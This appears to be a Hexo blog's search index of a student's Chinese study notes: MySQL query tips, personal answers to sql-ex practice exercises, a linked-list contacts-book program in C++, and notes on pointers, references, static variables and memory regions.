<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Mysql随笔</title>
    <url>/2024/10/19/Mysql%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h5 id="union-和-union-all的区别"><a href="#union-和-union-all的区别" class="headerlink" title="union 和 union all的区别"></a>union 和 union all的区别</h5><blockquote>
<p>union 会把结果的重复部分压缩，而union all则不会，因此在使用<code>count</code>,<code>avg</code>等函数时要注意使用union all，避免</p>
<p>使用union导致结果压缩而出现错误</p>
</blockquote>
<h5 id="将查询结果返回作为一个表"><a href="#将查询结果返回作为一个表" class="headerlink" title="将查询结果返回作为一个表"></a>将查询结果返回作为一个表</h5><blockquote>
<ul>
<li><p><code>with new_table_name as (select column1,column2,... from table)</code></p>
<p>​	<code>select * from new_table_name</code></p>
</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><code>select * from (select column1,column2,... from table)new_table_name</code></li>
</ul>
</blockquote>
<h5 id="查找第几大（小）的-数据"><a href="#查找第几大（小）的-数据" class="headerlink" title="查找第几大（小）的 数据"></a>查找第几大（小）的 数据</h5><blockquote>
<p><code>select * from table order by column limit n offset n</code></p>
</blockquote>
<h5 id="distinct-的作用范围"><a href="#distinct-的作用范围" class="headerlink" title="distinct 的作用范围"></a>distinct 的作用范围</h5><blockquote>
<p>以<code>select distinct column1,column2 from table</code>为例，distinct作用是消除重复项，此时每一个项为（column1_a,column2_b），因此作用范围是column1,column2</p>
</blockquote>
]]></content>
      <categories>
        <category>“&quot;运维&quot;</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>笔记</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>sql-ex习题</title>
    <url>/2024/10/18/sql-ex%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<h3 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h3><ul>
<li><p>The database scheme consists of four tables:</p>
</li>
<li><p>Product(maker, model, type)</p>
</li>
<li><p>PC(code, model, speed, ram, hd, cd, price)</p>
</li>
<li><p>Laptop(code, model, speed, ram, hd, screen, price)</p>
</li>
<li><p>Printer(code, model, color, type, price)</p>
</li>
</ul>
<blockquote>
<p>The Product table contains data on the maker, model number, and type of product (‘PC’, ‘Laptop’, or ‘Printer’). It is assumed that model numbers in the Product table are unique for all makers and product types. Each personal computer in the PC table is unambiguously identified by a unique code, and is additionally characterized by its model (foreign key referring to the Product table), processor speed (in MHz) – speed field, RAM capacity (in Mb) - ram, hard disk drive capacity (in Gb) – hd, CD-ROM speed (e.g, ‘4x’) - cd, and its price. The Laptop table is similar to the PC table, except that instead of the CD-ROM speed, it contains the screen size (in inches) – screen. For each printer model in the Printer table, its output type (‘y’ for color and ‘n’ for monochrome) – color field, printing technology (‘Laser’, ‘Jet’, or ‘Matrix’) – type, and price are specified.</p>
</blockquote>
<hr>
<p><strong>19.For each maker having models in the Laptop table, find out the average screen size of the laptops he produces.</strong></p>
<p><strong>Result set: maker, average screen size.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct maker,avg(l.screen) from Product p, Laptop l where p.model = l.model group by maker;</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>20.Find the makers producing at least three distinct models of PCs.</strong></p>
<p><strong>Result set: maker, number of PC models.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct maker,count(model) from Product where type=&#x27;PC&#x27;group by maker having count(model)&gt;=3;</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>21.Find out the maximum PC price for each maker having models in the PC table.</strong> </p>
<p><strong>Result set: maker, maximum price.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct maker,max(price) from Product p1,PC p2 where p1.model=p2.model group by maker;</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>22.For each value of PC speed that exceeds 600 MHz, find out the average price of PCs with identical speeds.</strong></p>
<p><strong>Result set: speed, average price.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select speed,avg(price) from PC where PC.speed &gt; 600 group by speed;</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>23.Get the makers producing both PCs having a speed of 750 MHz or higher and laptops with a speed of 750 MHz or higher.</strong></p>
<p><strong>Result set: maker</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct maker from Product where maker in (select distinct maker from Product p1,PC p2 where p1.model=p2.model and speed &gt;= 750) and maker in (select distinct maker from Product p1,Laptop p2 where p1.model=p2.model and speed &gt;=750)</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>24.List the models of any type having the highest price of all products present in the database.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with a as (select model,price from PC union select model,price from Laptop union select model,price from Printer )` `select model from a where price = (select max(price) from a)</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>26.Find out the average price of PCs and laptops produced by maker A.</strong><br> <strong>Result set: one overall average price for all items.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with a as(select price from PC p1 left join Product p2 on p1.model=p2.model where maker=&#x27;A&#x27;</span><br><span class="line">union all</span><br><span class="line">select price from Laptop p1 left join Product p2 on p1.model=p2.model where maker=&#x27;A&#x27;)</span><br><span class="line">select avg(price) from a</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<p><strong>27.Find out the average hard disk drive capacity of PCs produced by makers who also manufacture printers.</strong><br> <strong>Result set: maker, average HDD capacity.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with a as(select maker, model from Product where maker in (select distinct maker from Product where type=&#x27;Printer&#x27;))</span><br><span class="line">select  maker ,avg(hd) from PC p1 join a on p1.model=a.model group by maker</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>28.Using Product table, find out the number of makers who produce only one model.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with a as (select maker,count(model) count from Product group by maker)</span><br><span class="line">select count(maker) from</span><br><span class="line">(select maker from a where count=1)b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>cpp练习</title>
    <url>/2024/10/20/cpp%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h5 id="1-通讯录"><a href="#1-通讯录" class="headerlink" title="1.通讯录"></a>1.通讯录</h5><blockquote>
<p>设计一个通讯录系统，要求实现以下菜单功能：</p>
<ul>
<li>添加联系人</li>
<li>显示所有联系人</li>
<li>删除联系人</li>
<li>查询联系人</li>
<li>编辑联系人</li>
<li>清空联系人</li>
<li>退出菜单</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存储结构是链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">concats</span> &#123;</span><br><span class="line">	std::string name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	std::string phone_num = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	std::string gender = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	std::string house_address = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;<span class="comment">//判断是否已经添加信息</span></span><br><span class="line">	concats* next = <span class="literal">nullptr</span>;<span class="comment">//下一个节点的地址</span></span><br><span class="line"></span><br><span class="line">&#125;concats;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	concats* tmp = <span class="keyword">new</span> concats;</span><br><span class="line">	tmp-&gt;flag = <span class="literal">true</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入姓名：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; tmp-&gt;name;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入电话号码：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; tmp-&gt;phone_num;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入性别：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; tmp-&gt;gender;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入家庭地址：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; tmp-&gt;house_address;</span><br><span class="line">	<span class="keyword">while</span> (test_concats-&gt;next != <span class="literal">nullptr</span>)<span class="comment">//找出链表的最后的一个元素</span></span><br><span class="line">	&#123;</span><br><span class="line">		test_concats = test_concats-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	test_concats-&gt;next = tmp;<span class="comment">//添加新元素到队列中</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//显示联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (test_concats != <span class="literal">nullptr</span> &amp;&amp; test_concats-&gt;flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test_concats-&gt;name != <span class="string">&quot;&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; test_concats-&gt;name &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; test_concats-&gt;phone_num &lt;&lt; <span class="string">&quot;\t&quot;</span></span><br><span class="line">				&lt;&lt; test_concats-&gt;gender &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; test_concats-&gt;house_address &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		test_concats = test_concats-&gt;next;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">deletes</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string name;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入你要删除的联系人的名字：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; name;</span><br><span class="line">	concats* last_concats = <span class="keyword">new</span> concats;<span class="comment">// 辅助节点，假设有节点a,b,c,要删除节点b,则需要将c的地址传递给a.next，任何delete（c）</span></span><br><span class="line">	<span class="keyword">while</span> (test_concats != <span class="literal">nullptr</span> &amp;&amp; test_concats-&gt;flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test_concats-&gt;name != name)</span><br><span class="line">		&#123;</span><br><span class="line">			last_concats = test_concats;</span><br><span class="line">			test_concats = test_concats-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			last_concats-&gt;next = test_concats-&gt;next;</span><br><span class="line">			<span class="built_in">delete</span>(test_concats);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;未找到该联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string name;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入你要查询的联系人的名字：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; name;</span><br><span class="line">	<span class="keyword">while</span> (test_concats != <span class="literal">nullptr</span> &amp;&amp; test_concats-&gt;flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test_concats-&gt;name != name)</span><br><span class="line">		&#123;</span><br><span class="line">			test_concats = test_concats-&gt;next;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; test_concats-&gt;name &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; test_concats-&gt;phone_num &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; test_concats-&gt;gender</span><br><span class="line">				&lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; test_concats-&gt;house_address &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;未找到该联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">edit</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	concats* tmp = <span class="keyword">new</span> concats;</span><br><span class="line">	std::string name;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;请输入你要修改的联系人的名字：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin &gt;&gt; name;</span><br><span class="line">	<span class="keyword">while</span> (test_concats != <span class="literal">nullptr</span> &amp;&amp; test_concats-&gt;flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test_concats-&gt;name == name)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;请输入新的手机号码：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			std::cin &gt;&gt; test_concats-&gt;phone_num;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;请输入新的家庭地址：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			std::cin &gt;&gt; test_concats-&gt;house_address;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			test_concats = test_concats-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;很抱歉，未找到该联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//清空联系人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">(concats* test_concats)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	concats* tmp;</span><br><span class="line">	<span class="keyword">while</span> (test_concats-&gt;next != <span class="literal">nullptr</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		tmp = test_concats-&gt;next;</span><br><span class="line">		test_concats-&gt;next = (test_concats-&gt;next)-&gt;next;<span class="comment">//有问题</span></span><br><span class="line">		<span class="built_in">delete</span>(tmp);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建链表，第一个元素为链表头，不存储任何联系人信息，但是flag设置为true；</span></span><br><span class="line">	concats* test_concats = <span class="keyword">new</span> concats;</span><br><span class="line">	test_concats-&gt;flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">enum</span> <span class="title class_">operations</span> &#123; add_concats = <span class="number">1</span>, display_concats, delete_concats, query_concats, edit_concats, clear_concats, quit &#125;; <span class="comment">// 定义枚举类型operations</span></span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;******************************&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;请输入您的选择：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;1.添加联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;2.显示所有联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;3.删除联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;4.查询联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;5.编辑联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;6.清空联系人&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;0.退出菜单&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;******************************&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		std::cin &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (choice)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> add_concats:</span><br><span class="line">			<span class="built_in">add</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> display_concats:</span><br><span class="line">			<span class="built_in">display</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> delete_concats:</span><br><span class="line">			<span class="built_in">deletes</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> query_concats:</span><br><span class="line">			<span class="built_in">query</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> edit_concats:</span><br><span class="line">			<span class="built_in">edit</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> clear_concats:</span><br><span class="line">			<span class="built_in">clear</span>(test_concats);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> quit:</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>“&quot;c++&quot;</category>
        <category>练习</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>练习</tag>
      </tags>
  </entry>
  <entry>
    <title>函数与指针</title>
    <url>/2024/10/18/%E5%87%BD%E6%95%B0%E4%B8%8E%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h5 id="使用函数计算数组大小"><a href="#使用函数计算数组大小" class="headerlink" title="使用函数计算数组大小"></a>使用函数计算数组大小</h5><blockquote>
<p>指针在win64系统的大小是8字节</p>
</blockquote>
<blockquote>
<p><code>int *p</code>在进行<code>p++</code>操作时，p的值会增加4字节；而如果是<code>double *p</code>在进行<code>p++</code>操作时，p的值会增加8字节，增加的字节数与指针指向的变量类型有关，需要与区别好指针的大小</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">(<span class="type">int</span>* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;数组长度为&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> p[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;数组长度为&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func3</span><span class="params">(<span class="type">int</span> p[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;数组长度为&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	<span class="built_in">func1</span>(arr);				<span class="comment">//结果为8</span></span><br><span class="line">	<span class="built_in">func2</span>(arr);				<span class="comment">//结果为8</span></span><br><span class="line">	<span class="built_in">func3</span>(arr);				<span class="comment">//结果为8</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>c++</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>cpp笔记</title>
    <url>/2024/10/19/cpp%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h5><blockquote>
<ul>
<li><p>含义：形参相当于是实参的“别名”，对形参的操作其实就是对实参的操作；而不是像按值传递那样，形参是实参的拷贝</p>
<p>类比一个人，无论是他的正式名字还是别名，指的都是同一个人</p>
<p>注意：必须初始化，且初始化后不能改变（区分赋值）</p>
</li>
<li><p>示例：</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="comment">//函数传参:地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap1</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> tmp;</span><br><span class="line">	tmp = (*a);</span><br><span class="line">	(*a) = (*b);</span><br><span class="line">	(*b) = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数传参：引用传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap2</span><span class="params">(<span class="type">int</span>&amp; c, <span class="type">int</span>&amp; d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> tmp;</span><br><span class="line">	tmp = c;</span><br><span class="line">	c = d;</span><br><span class="line">	d = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;b:&quot;</span> &lt;&lt;b &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">swap1</span>(&amp;a, &amp;b);<span class="comment">//按地址传递</span></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;swap1后：&quot;</span>  &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;b:&quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">swap2</span>(a, b);<span class="comment">//引用传递</span></span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;swap2后：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;b:&quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>底层原理：</p>
<p>实际上是由一个指针实现的</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>底层原理相当于：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_real</span><span class="params">(<span class="type">int</span> * <span class="type">const</span> a)</span> <span class="comment">//这个指针的值不可变，但是指向的内容可以改变</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	(*a)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</blockquote>
<h5 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h5><blockquote>
<p>含义：static 表示将内容存入静态内存区域，可以修饰变量，函数</p>
<p>当static 在函数内修饰变量，可以将变量的生命周期延长至整个程序结束，示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">test1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	 <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* result1 = <span class="built_in">test1</span>();</span><br><span class="line">	<span class="type">int</span>* result2 = <span class="built_in">test2</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;test&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="comment">//打印这些是为了留多点时间给系统回收空间不然执行太快，test2里面的num在执行完函数来不及回收空间</span></span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; *result1 &lt;&lt; std::endl;  <span class="comment">//结果为0</span></span><br><span class="line">	std::cout &lt;&lt; *result2 &lt;&lt; std::endl;  <span class="comment">//结果为-858993460</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</blockquote>
<h5 id="c-内存分区"><a href="#c-内存分区" class="headerlink" title="c++内存分区"></a>c++内存分区</h5><blockquote>
<ul>
<li>代码区：存放函数体的二进制代码，由操作系统管理</li>
<li>全局区：存放全局变量，静态变量，常量</li>
<li>栈区：由编译器自动分配释放，存放函数的参数值，局部变量等</li>
<li>堆区：由程序员分配释放，程序结束后系统回收</li>
</ul>
</blockquote>
<blockquote>
<p><strong>程序执行前</strong></p>
<p>在编译后，生成.exe可执行文件，此时未执行区域分两个区域：</p>
<ul>
<li><p>代码区：</p>
<ul>
<li>存放cpu指令</li>
<li>代码区是共享的，因为程序可以被多次执行，但只需要存放一份代码进行</li>
<li>代码区是只读的，防止意外修改了指令</li>
</ul>
</li>
<li><p>全局区</p>
<ul>
<li><p>存放全局变量和静态变量</p>
</li>
<li><p>也包含了常量区，字符串常量和其他常量也存放在这</p>
</li>
<li><p>程序结束后操作系统释放</p>
</li>
</ul>
</li>
</ul>
</blockquote>
